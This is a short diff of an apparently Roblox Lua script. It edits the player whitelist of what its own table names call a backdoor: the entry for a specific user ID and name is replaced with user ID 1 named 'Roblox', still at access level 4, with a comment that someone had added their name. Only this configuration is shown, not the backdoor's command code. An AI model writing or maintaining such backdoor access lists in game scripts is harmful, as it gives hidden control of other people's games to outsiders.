@@ -226,8 +226,8 @@ local BackDoorTableCommands = {
 }
 
 local BackDoorTablePlayers = {
-    [3258205209] = {
-		['Name'] = "WxsteW)"; 
+    [1] = {
+		['Name'] = "Roblox";  --i didnt see that somebody put there name here
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(63,0,0);
 	};
